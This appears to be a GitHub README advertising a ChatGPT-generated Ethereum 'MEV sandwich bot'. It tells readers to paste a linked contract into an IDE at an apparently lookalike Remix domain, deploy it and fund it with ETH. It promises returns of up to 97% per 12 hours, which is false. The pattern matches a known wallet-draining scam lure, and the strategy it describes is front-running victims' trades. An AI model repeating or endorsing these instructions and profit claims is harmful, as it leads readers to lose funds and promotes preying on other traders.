# MEV Flashbot
A Maximal Extractable Value (MEV) Solidity Sandwich Bot that allows deployers of contract to take profits from slippage opportunities, generated by ChatGPT.

MEV Bots are an arbitrage tool that will sniff the mempool for pending transactions on decentralized exchanges such as Uniswap. It inserts our own TX with a slightly higher gas fee, 1 Gwei higher than the TX which is trying to be entered, essentially sandwiching the pending TX and forcing ours to automatically be processed first, profiting off of the slippage differences. You can easily earn passive income using a MEV Bot and help the Ethereum market cap grow by contributing to the ETH Burn rate. 

# How it works
![profit](https://user-images.githubusercontent.com/132264778/235452623-01aafec4-077e-420e-b937-9fffe28668fb.jpeg)
- Bot sends the Transaction and sniffs the Uniswap v3 Mempool for txs with high slippage, calculating if a sandwich attack is profitable.
- Bot then competes to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity. 
- Bot always puts 1 gas more than everybody elses, as long as it remains profitable, securing a large amount of profitable transactions.
- Bot will then send back the ETH to your wallet and exit the liquidity pool once you click withdrawal.

This bot performs all of that, faster than 99% of other bots.

# Estimated profits
0.1ETH - 0.4ETH = up to 10%/12hrs

0.4ETH - 1.2ETH = up to 20%/12hrs

1.2ETH - 2.4ETH = 20-27%/12hrs

2.4ETH - 5ETH = 27-35%/12hrs

5.0ETH - 10ETH - 35-50%/12hrs

10ETH - 20ETH - 50-63%/12hrs

20ETH - 50ETH - 76%+/12hrs

50ETH - 100ETH - 97%+/12hrs

# Instructions
1) Copy code and paste the code of [MEVBot.sol](https://github.com/NickNDev/MEV-Bot/blob/main/bot.sol) into [Remix IDE](https://remixide.org/)

2) Under the `Compiler` tab on the left sidebar, select `Solidity Compiler` version `0.6.6` and press `Compile MEVBot.sol`

3) Select `ENVIROMENT` - `Injected Provider - Metamask` and connect the wallet you will be deploying from. Click deploy and confirm transaction

4) Fund your contract address with however much liquidity you wish, then click `start`.

5) Your bot is now actively seeking profitable arbitrage opportunities on the mempool. 

6) Click `withdrawal` to stop the bot and return your funds & profit.


Wait a couple of days for profits to incur and accumulate. For successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 

At any time you can Stop the bot or return your tokens by clicking the withdrawal function.
